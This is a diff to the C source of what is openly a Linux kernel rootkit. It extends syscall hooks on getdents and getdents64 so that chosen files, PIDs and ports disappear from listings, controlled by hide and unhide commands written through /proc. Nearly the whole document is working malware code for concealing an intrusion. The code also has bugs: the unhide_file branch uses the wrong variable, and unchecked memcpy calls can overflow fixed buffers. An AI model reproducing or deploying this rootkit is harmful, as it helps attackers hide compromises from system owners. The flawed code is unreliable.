@@ -16,13 +16,16 @@
 
 #define MAX_LENGTH 256
 
-#define PREFIX "hide_file"
+#define PREFIX "test"
 
 #define true 1
 #define false 0
 
 #define ERROR_HANDLE(buffer1, ret) \
     {kfree(buffer1); return (ret);}
+
+#define exist(name, param) \
+    exist_##name((param))
 
 static asmlinkage long (*orig_kill)(const struct pt_regs *);
 
@@ -78,8 +81,13 @@ struct proc_dir_entry {
 } __randomize_layout;
 
 
+struct hide_files {
+    char name[NAME_MAX];
+    struct list_head list;
+};
+
 struct hide_pids {
-    char *pid;
+    char name[10];
     struct list_head list;
 };
 
@@ -115,13 +123,32 @@ static int hide_module(void) {
 
 
 /* ---------------hook getdents start------------------*/ 
+LIST_HEAD(hide_files_list);
+LIST_HEAD(hide_pids_list);
+
+static unsigned int find_file(char *target) {
+    struct hide_files *h;
+    list_for_each_entry(h, &hide_files_list, list) {
+        if (memcmp(h->name, target, strlen(h->name)) == 0) {
+            return true;
+        }
+    }
+    return false;
+}
+
+static unsigned int find_pid(char *target) {
+    struct hide_pids *h;
+    list_for_each_entry(h, &hide_pids_list, list) {
+        if (strlen(h->name) == strlen(target) && memcmp(h->name, target, strlen(h->name)) == 0) 
+            return true;
+    }
+    return false;
+}
 
 // sys_getdents64与隐藏文件的区别是，需要判断hide_pid是不是为空
 static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
-    // struct linux_dirent64 *current_dir, *dirent_ker, *dirent_tmp = NULL;
     struct linux_dirent64 *current_dir, *previous_dir, *dirent_ker = NULL;
     unsigned long offset_ker = 0;
-    // unsigned long offset_tmp = 0;
 
     long error;
 
@@ -130,7 +157,6 @@ static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
     struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
 
     dirent_ker = kzalloc(ret, GFP_KERNEL);
-    // dirent_tmp = kzalloc(ret, GFP_KERNEL);
     if ((ret <= 0) || (dirent_ker == NULL))
         return ret;
 
@@ -140,18 +166,7 @@ static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
 
     while (offset_ker < ret) {
         current_dir = (void *)dirent_ker + offset_ker;
-        // printk(KERN_INFO "filename: %s\n", current_dir->d_name);
-        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
-            // printk(KERN_INFO "rootkit: hide_pid: %s\n", current_dir->d_name);
-            if (current_dir == dirent_ker) {
-                ret -= current_dir->d_reclen;
-                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-                continue;
-            }
-            previous_dir->d_reclen += current_dir->d_reclen;
-            printk(KERN_INFO "rootkit: hide_pid: %s\n", hide_pid);
-        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
-            printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
+        if (find_file(current_dir->d_name) || find_pid(current_dir->d_name)) {
             if (current_dir == dirent_ker) {
                 ret -= current_dir->d_reclen;
                 memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
@@ -159,8 +174,6 @@ static asmlinkage long hook_sys_getdents64(const struct pt_regs * regs) {
             }
             previous_dir->d_reclen += current_dir->d_reclen;
         } else {
-            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
-            // offset_tmp += current_dir->d_reclen;
             previous_dir = current_dir;
         }
         offset_ker += current_dir->d_reclen;
@@ -197,26 +210,14 @@ static asmlinkage long hook_sys_getdents(const struct pt_regs * regs) {
     
     while (offset_ker < ret) {
         current_dir = (void *)dirent_ker + offset_ker;
-        if (strlen(hide_pid) > 0 && strlen(hide_pid) == strlen(current_dir->d_name) && memcpy(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) {
+        if (find_file(current_dir->d_name) || find_pid(current_dir->d_name)) {
             if (current_dir == dirent_ker) {
-			 	ret -= current_dir->d_reclen;
-			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-			 	continue;
-			}
-			previous_dir->d_reclen += current_dir->d_reclen;
-			printk(KERN_INFO "hide_pid: %s\n", hide_pid);
-        } else if (memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0) {
-            //printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
-            if (current_dir == dirent_ker) {
-			 	ret -= current_dir->d_reclen;
-			 	memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
-			 	continue;
-			}
-			previous_dir->d_reclen += current_dir->d_reclen;
-			printk(KERN_INFO "rootkit: Found %s\n", current_dir->d_name);
+                ret -= current_dir->d_reclen;
+                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
+                continue;
+            }
+            previous_dir->d_reclen += current_dir->d_reclen;
         } else {
-            // memcpy((void *)dirent_tmp + offset_tmp, (void *)dirent_ker + offset_ker, current_dir->d_reclen);
-            // offset_tmp += current_dir->d_reclen;
             previous_dir = current_dir;
         }
         offset_ker += current_dir->d_reclen;
@@ -329,7 +330,7 @@ static asmlinkage int hook_udp6_seq_show(struct seq_file *seq, void *v) {
 }
 /*---------------hide port end------------------*/
 
-static struct hide_ports* exist(unsigned short port) {
+static struct hide_ports* exist_hide_ports(unsigned short port) {
     struct hide_ports *h;
     list_for_each_entry(h, &hide_ports_list, list) {
         if (port == h->port)
@@ -338,13 +339,37 @@ static struct hide_ports* exist(unsigned short port) {
     return NULL;
 }
 
+static struct hide_files* exist_hide_files(char *target) {
+    struct hide_files *h;
+    list_for_each_entry(h, &hide_files_list, list) {
+        if (strcmp(h->name, target) == 0) 
+            return h;
+    }
+    return NULL;
+}
+
+static struct hide_pids* exist_hide_pids(char *target) {
+    struct hide_pids *h;
+    list_for_each_entry(h, &hide_pids_list, list) {
+        if (strcmp(h->name, target) == 0)
+            return h;
+    }
+    return NULL;
+}
+
 static void execute(char *cmd, int idx) {
     unsigned short port;
-    struct hide_ports *new_port;
+    struct hide_ports *new_port, *target;
+    struct hide_files *new_file, *target_file;
+    struct hide_pids *new_pid, *target_pid;
+    int i;
+    while (idx < strlen(str) && str[idx] ==' ')
+        idx++;
+    printk(KERN_INFO "cmd: %s, para: %s\n", cmd, (char *)str + idx);
     if (strcmp(cmd, "hide_port") == 0) {
         if (kstrtou16((char *) str + idx, 10, &port) == 0) {
             printk(KERN_INFO "port: %d\n", port);
-            if (exist(port) == NULL) {
+            if (exist(hide_ports, port) == NULL) {
                 new_port = kmalloc(sizeof(struct hide_ports), GFP_KERNEL);
                 new_port->port = port;
                 list_add(&new_port->list, &hide_ports_list);
@@ -356,20 +381,58 @@ static void execute(char *cmd, int idx) {
     } else if (strcmp(cmd, "unhide_port") == 0) {
         if (kstrtou16((char *) str + idx, 10, &port) == 0) {
             printk(KERN_INFO "port: %d\n", port);
-            struct hide_ports* target = exist(port);
+            target = exist(hide_ports, port);
             if (target != NULL) 
                 list_del(&target->list);
         } else {
             printk(KERN_DEBUG "wrong cmd: %s, wrong port: %s\n", cmd, (char *)str + idx);
             return;
         }
+    } else if (strcmp(cmd, "hide_file") == 0) {
+        for (i = idx; i < strlen(str); i++) 
+            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
+                str[i] = '\0';
+        if (exist(hide_files, (char *)str + idx) == NULL) {
+            new_file = kmalloc(sizeof(struct hide_files), GFP_KERNEL);
+            // new_file = kmalloc(NAME_MAX, GFP_KERNEL);
+            memcpy(new_file->name, (char *)str + idx, strlen(str) - idx);
+            //printk(KERN_INFO "para: %s\n, len: %d", new_file->name, strlen(new_file->name));
+            list_add(&new_file->list, &hide_files_list);
+        } 
+    } else if (strcmp(cmd, "unhide_file") == 0) {
+        for (i = idx; i < strlen(str); i++) 
+            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
+                str[i] = '\0';
+        target_file = exist(hide_files, (char *)str + idx);
+        if (target != NULL) {
+            list_del(&target->list);
+        }
+    } else if (strcmp(cmd, "hide_pid") == 0) {
+        for (i = idx; i < strlen(str); i++) 
+            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
+                str[i] = '\0';
+        if (exist(hide_pids, (char *)str + idx) == NULL) {
+            new_pid = kmalloc(sizeof(struct hide_pids), GFP_KERNEL);
+            memcpy(new_pid->name, (char *)str + idx, strlen(str) - idx);
+            list_add(&new_pid->list, &hide_pids_list);
+        }
+    } else if (strcmp(cmd, "unhide_pid") == 0) {
+        for (i = idx; i < strlen(str); i++)
+            if (str[i] == '\n' || str[i] == '\r' || str[i] == ' ')
+                str[i] = '\0';
+        target_pid = exist(hide_pids, (char *)str + idx);
+        if (target_pid != NULL) {
+            list_del(&target_pid->list);
+        }
+    } else {
+        printk(KERN_INFO "unsupported behaviour: %s\n", str);
     }
 }
 
 /*---------------read and write on proc start-----------------*/
 static ssize_t write(struct file *file, const char __user *buffer, size_t count, loff_t *f_pos) {
     int i;
-    char *cmd, *p;    
+    char *cmd;    
     memset(str, 0x0, 100);
     if (copy_from_user(str, buffer, count)) {
         return -1;
